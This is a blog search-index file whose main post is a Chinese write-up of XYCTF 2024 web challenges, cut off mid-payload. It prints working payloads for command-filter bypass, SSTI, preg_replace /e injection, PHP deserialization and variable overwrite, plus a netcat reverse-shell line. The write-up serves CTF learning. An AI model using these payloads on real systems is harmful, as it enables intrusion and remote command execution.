<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>复现计划——NewStarCTF 2023</title>
      <link href="/2024/04/27/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/"/>
      <url>/2024/04/27/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/</url>
      
        <content type="html"><![CDATA[<p><img src="https://picx.zhimg.com/80/v2-0200aa69c36fdd722172c0a2b0dfdb39_1440w.png" alt="" /><br />五一开肝，上学期太摆烂了，打了两周就打不动了，不打了，这次一定要赢回来，会萤的</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>复现计划——DASCTF X GFCTF 2024｜四月开启第一局</title>
      <link href="/2024/04/27/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/"/>
      <url>/2024/04/27/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<p>预计五一期间完成，然后NewStarCTF 2023，回到梦的起点</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024wp</title>
      <link href="/2024/04/27/XYCTF2024wp/"/>
      <url>/2024/04/27/XYCTF2024wp/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="web-ezmake"><a class="markdownIt-Anchor" href="#web-ezmake"></a> Web ezmake</h2><p>题目提示flag在当前目录下，直接读一下flag试试？<br /><code>url/flag</code><br />算是非预期了<br />去了解一下makefile究竟是怎么读取文件的<br /><a href="https://www.yisu.com/ask/27496422.html">https://www.yisu.com/ask/27496422.html</a><br /><code>content := $(shell cat flag)</code></p><h2 id="web-ezhttp"><a class="markdownIt-Anchor" href="#web-ezhttp"></a> Web ezhttp</h2><p>robots.txt，得到账号密码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Referer: yuanshen.com</span><br><span class="line">User Agent: XYCTF</span><br><span class="line">Client-IP: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Via: ymzx.qq.com</span><br><span class="line">Cookie: XYCTF</span><br></pre></td></tr></table></figure><p>记一个常用的请求头</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Client-ip:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Remote-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Rriginating-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Remote-addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">HTTP_CLIENT_IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Real-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Originating-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">via:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><h2 id="web-ezmake-2"><a class="markdownIt-Anchor" href="#web-ezmake-2"></a> Web ez?Make</h2><p>过滤了f l a g @ $ * ? / 等</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sort `pwd | cut -c <span class="number">1</span>`[!q][k-m][!q][e-h]</span><br></pre></td></tr></table></figure><p>`pwd | cut -c 1`构造<code>/</code><br />后面构造flag<br />sort 可针对文本文件的内容，以行为单位来排序<br />来自队友的解释，新姿势！new！</p><p>同时，我们还发现nc没有被过滤，但是<code>/</code>被过滤了，也可以试试反弹shell看看</p><p>赛后发现的好东西，反引号命令执行反弹shell，<strong>`nc ip port -e sh`</strong></p><p>还可以，先利用xxd转换和管道符传递最后用反引号来执行<br /><strong>`echo 636174202F666c6167 | xxd -r -p`</strong></p><p>其实，这个我下面笔记有，但当时看见bash有a然后就放弃了，其实可以不要bash的，emmm</p><p>类似这种过滤的别的题目，这里做个笔记</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!!!!!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">需要绕过字母，给一组绕过字母的payload:</span><br><span class="line"><span class="number">1</span>、<span class="keyword">echo</span> Y2F0IC9mbGFn| base64 -d | sh <span class="comment">#cat /flag</span></span><br><span class="line"><span class="number">2</span>、<span class="keyword">echo</span> <span class="number">636174202</span>f666c6167 | xxd -r -p | bash <span class="comment">#cat /flag 16进制</span></span><br><span class="line"><span class="number">3</span>、通配符 more /[b-z][b-z][@-z][b-z]</span><br><span class="line"><span class="number">4</span>、a=g.php; cat fla<span class="variable">$a</span></span><br></pre></td></tr></table></figure><p>然后在这个姿势下面再记录一个别的知识点，怕以后想找找不到了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">利用 <span class="title function_ invoke__">create_function</span>() 函数创建匿名函数来代码注入</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nss</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>];</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shell</span>)&amp;&amp; <span class="keyword">isset</span>(<span class="variable">$nss</span>))&#123;</span><br><span class="line">        <span class="variable">$nss_shell</span> = <span class="title function_ invoke__">create_function</span>(<span class="variable">$shell</span>,<span class="variable">$nss</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># shell=&amp;nss=;&#125;system(&#x27;cat /flag&#x27;);/*</span></span><br></pre></td></tr></table></figure><h2 id="web-ezmd5"><a class="markdownIt-Anchor" href="#web-ezmd5"></a> Web ezmd5</h2><p>找两张MD5值相等的jpg格式的图片<br />直接搜，指路<a href="https://blog.csdn.net/rclijia/article/details/114400242">https://blog.csdn.net/rclijia/article/details/114400242</a><br />要拿原文的图片!!!<br />其实应该是通过fastcoll工具生成的，但是大小没有作限制，那就不管了</p><h2 id="web-warm-up"><a class="markdownIt-Anchor" href="#web-warm-up"></a> Web warm up</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单，MD5若比较没什么好说的了，注意到<code>extract($_GET)</code>，变量覆盖，重新给XYCTF赋值即可<br /><code>?val1=QNKCDZO&amp;val2=240610708&amp;md5=0e215962017&amp;XY=0e215962017&amp;XYCTF=0e215962017</code><br />得到<code>LLeeevvveeelll222.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，intval中传入数组时，会判断数组中的是否存在元素，有则返回1，否则返回0，preg_match当检测的变量是数组的时候会报错并返回0，使用数组绕过<br />其次，注意到<code>preg_replace</code>存在<code>/e</code>漏洞，指路<a href="https://www.cnblogs.com/linfangnan/p/13625741.html">https://www.cnblogs.com/linfangnan/p/13625741.html</a><br />payload:<code>?a=/abc/e&amp;b=system('cat /flag')&amp;c=abc</code>，再post: <code>a[]=1</code>即可</p><h2 id="web-ezrce"><a class="markdownIt-Anchor" href="#web-ezrce"></a> Web ezRCE</h2><p>bash八进制读取，通过两次here-strings的方法来解析复杂的带参数命令<br />具体可参考安洵杯2020<br /><a href="https://xz.aliyun.com/t/8581?time__1311=n4%2BxuDgDBDyDRnzD%2FD0Yojqaxf2rDAhx2iD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8581#toc-3">https://xz.aliyun.com/t/8581?time__1311=n4%2BxuDgDBDyDRnzD%2FD0Yojqaxf2rDAhx2iD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8581#toc-3</a><br />改一下官方脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">dict</span>()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">&#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_oct</span>(<span class="params">cmd</span>):  <span class="comment"># 命令转换成八进制字符串</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">&#x27;%s&#x27;</span> % (<span class="built_in">oct</span>(<span class="built_in">ord</span>(t))))[<span class="number">2</span>:]</span><br><span class="line">        s += <span class="string">&#x27;\\&#x27;</span>+o</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">cmd</span>):  <span class="comment"># 八进制字符串转换成字符</span></span><br><span class="line">    payload = <span class="string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload += n[<span class="built_in">int</span>(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;ls /&quot;</span></span><br><span class="line"><span class="built_in">print</span>(build(payload))</span><br></pre></td></tr></table></figure><p>有兴趣也可以看<strong>CTFShow极限rce</strong>，原理类似</p><p>赛后发现，其实一次<strong>Here String</strong>也可以<br /><strong>Here String</strong>用于将字符串作为命令的标准输入提供给命令。它的语法形式是 &lt;&lt;&lt;，后跟一个字符串，比如：<code>command &lt;&lt;&lt; &quot;string&quot; </code><br /><strong>Here String</strong>的作用类似于使用管道将字符串传递给命令，但它更简洁，因为不需要使用 echo 或其他命令来产生输入。<br />意思就可以直接产生传入并传给指定的command中从而使得bash可以执行有参数传入的函数<br />利用$0表示当前的脚本——bash</p><p>$0&lt;&lt;&lt;$‘\143\141\164\40\57\146\154\141\147’<br /><strong>(cat /flag)</strong><br /><a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEH4Quxiuq7q29hyGD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-2">https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEH4Quxiuq7q29hyGD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-2</a></p><h2 id="web-我是一个复读机"><a class="markdownIt-Anchor" href="#web-我是一个复读机"></a> Web 我是一个复读机</h2><p>爆破账号密码<br /><code>admin,asdqwe</code><br />无意输入中文发现解析成<code>&#123;&#125;</code>，开始尝试SSTI模板注入<br />发现过滤了，<code>_&#123;&#125;[]'</code>，以及一些关键的函数，包括有<code>func</code>等<br />尝试绕过，借鉴一下<br /><a href="https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF">https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#常规绕过姿势</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()(<span class="number">128</span>).__init__.__globals__(<span class="string">&#x27;__builtins__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&#x27;</span>os<span class="string">&#x27;).popen(&#x27;</span>cat /flag<span class="string">&#x27;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">我()|attr(request.args.v1)|attr(request.args.v2)|attr(request.args.v3)()(<span class="number">128</span>)|attr(request.args.v4)|attr(request.args.v5)(request.args.v6)(request.args.v7)(request.args.v8)我&amp;v1=__class__&amp;v2=__base__&amp;v3=__subclasses__&amp;v4=__init__&amp;v5=__globals__&amp;v6=__builtins__&amp;v7=<span class="built_in">eval</span>&amp;v8=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">第一个居然不行，只好构造第二个喽</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">80</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&#x27;</span>os<span class="string">&#x27;).popen(&#x27;</span>cat /flag<span class="string">&#x27;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">我()|attr(request.args.v1)|attr(request.args.v2)|attr(request.args.v3)()|attr(request.args.v4)(<span class="number">80</span>)|attr(request.args.v5)|attr(request.args.v6)|attr(request.args.v4)(request.args.v7)|attr(request.args.v4)(request.args.v8)(request.args.v9)我&amp;v1=__class__&amp;v2=__base__&amp;v3=__subclasses__&amp;v4=__getitem__&amp;v5=__init__&amp;v6=__globals__&amp;v7=__builtins__&amp;v8=<span class="built_in">eval</span>&amp;v9=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web-εzмkε"><a class="markdownIt-Anchor" href="#web-εzмkε"></a> Web εZ?¿м@Kε¿?</h2><p>手动测试，发现长度限制在7以内，未被过滤的只剩符号<code>&gt;&lt;@$()-</code>，肯定是围绕<code>$</code>做文章的<br /><a href="https://zhuanlan.zhihu.com/p/601876715">https://zhuanlan.zhihu.com/p/601876715</a><br /><a href="https://www.cnblogs.com/lelin/p/11152780.html">https://www.cnblogs.com/lelin/p/11152780.html</a></p><p><code>$&lt;</code>，自动化变量，第一个依赖文件的名称，试一下，发现<br /><img src="https://pic1.zhimg.com/80/v2-90fb13bc8f19c0cad44ffedfc7307f25_1440w.png" alt="" /><br /><code>$&lt;</code>就是<code>/flag</code>，那么<code>$&lt;</code>它就属于一个变量吧</p><p>美元符号<code>$</code>，主要扩展打开makefile中定义的<strong>变量</strong><br /><code>$$</code>代表真实的<code>$</code>，<code>$$</code>符号主要扩展打开makefile中定义的<strong>shell变量</strong></p><p><code>$($&lt;)</code>，<code>$(/flag)</code>试了一下，不行，那<code>/flag</code>应该是属于<strong>shell变量</strong>才对<br /><code>$$($&lt;)</code>，试一下makefile中定义的<strong>shell变量</strong>？<br /><img src="https://picx.zhimg.com/80/v2-a327a9a7399b4ddfd47847ecebcfdf30_1440w.png" alt="" /></p><p>也不行，再去了解一下<code>&lt;</code>和<code>&gt;</code>的功能</p><ul><li><code>&lt;</code>符号用于重定向输入，即将命令的输入从一个文件中读取,而不是从标准输入（键盘）</li><li><code>&gt;</code>符号用于重定向输出，即将命令的输出写入一个文件，而不是在屏幕上显示</li></ul><p>那么试一下从<code>/flag</code>读一下，<code>$$(&lt;$&lt;)</code>，<code>$(&lt;/flag)</code><br /><img src="https://picx.zhimg.com/80/v2-1a6195777ef6ee2e83aa4d6c802a2957_1440w.png" alt="" /></p><p>赛后发现<code>$(&lt;$&lt;)</code>跟<code>$$(&lt;$&lt;)</code>是一样的</p><h2 id="web-ezpop"><a class="markdownIt-Anchor" href="#web-ezpop"></a> Web ezPOP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">           <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">           <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">           <span class="variable">$b</span> = <span class="variable">$_POST</span>;</span><br><span class="line">           <span class="variable">$c</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">           <span class="variable">$d</span> = <span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">               <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>, <span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">       <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>链子很简单：<code>CCC::__destruct()-&gt;AAA::__toString()-&gt;BBB::__get()</code><br />主要是对<code>call_user_func($a, $b)($c)($d);</code>的理解<br />还有这个姿势需要注意，<strong>PHP GC垃圾回收机制</strong><br /><a href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD%2FQbyqQqGKprwQC0CeD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0">https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD%2FQbyqQqGKprwQC0CeD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0</a><br />还有就是<code>if (isset($b['a'])) &#123;                 unset($b['a']);             &#125;</code><br />传入的b数组的a值会被删掉<br />关于数组<br /><img src="https://pic1.zhimg.com/80/v2-0417dcc9f73481a4991ea4d57a33a7de_1440w.png" alt="" /></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$c</span> = <span class="keyword">array</span>(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;c-&gt;s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>, <span class="number">0</span>));</span><br><span class="line"><span class="comment">#  a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;s:1:&quot;d&quot;;s:9:&quot;cat /flag&quot;;&#125;s:1:&quot;a&quot;;N;&#125;&#125;i:1;i:0;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/?xy=a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;CCC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;AAA&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;BBB&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;&#125;&#125;i:<span class="number">0</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line">post: a=array_pop&amp;b=array_pop</span><br><span class="line">array_pop(<span class="built_in">array</span>)是删除数组元素并返回(这个想法基于题目的删除机制想出来的)</span><br><span class="line">array_pop(<span class="built_in">array</span>(<span class="string">&quot;array_pop&quot;</span>))(<span class="built_in">array</span>(<span class="string">&quot;system&quot;</span>))(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">array_pop(<span class="built_in">array</span>(<span class="string">&quot;system&quot;</span>))(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">system(<span class="string">&quot;cat 